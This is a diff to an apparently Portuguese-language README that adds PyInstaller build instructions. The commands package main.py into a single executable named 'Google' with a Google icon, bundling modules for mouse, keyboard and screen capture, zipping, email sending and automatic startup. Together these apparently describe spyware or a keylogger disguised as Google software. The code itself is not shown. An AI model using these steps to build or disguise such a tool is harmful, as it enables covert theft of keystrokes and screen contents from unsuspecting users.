@@ -64,5 +64,8 @@ Por via das dúvidas:
 <ul>
   <li><strong>pyinstaller</strong>: Usamos essa biblioteca, pois o com ela podemos dar o nosso comando:
   <pre><code>pyinstaller --onefile --name Google --icon=google.ico main.py</code></pre>
+    Caso de erro na hora de executar o programa e ele não chamar os outros scripts, tente colocar ele assim:
+<pre><code>pyinstaller --onefile --add-data "caminho_até_aqruivo\mouse.py;." --add-data "caminho_até_aqruivo\teclado.py;." --add-data "caminho_até_aqruivo\tela.py;." --add-data "caminho_até_aqruivo\Zip.py;." --add-data "caminho_até_aqruivo\send_email.py;." --add-data "caminho_até_aqruivo\inicializacao_automatica.py;." main.py
+</code></pre>
     Com esse código, transformamos o projeto em um arquivo executável com o nome de nossa escolha (no exemplo dado foi Google) e colocamos o icone de nossa preferência.</li>
 </ul>
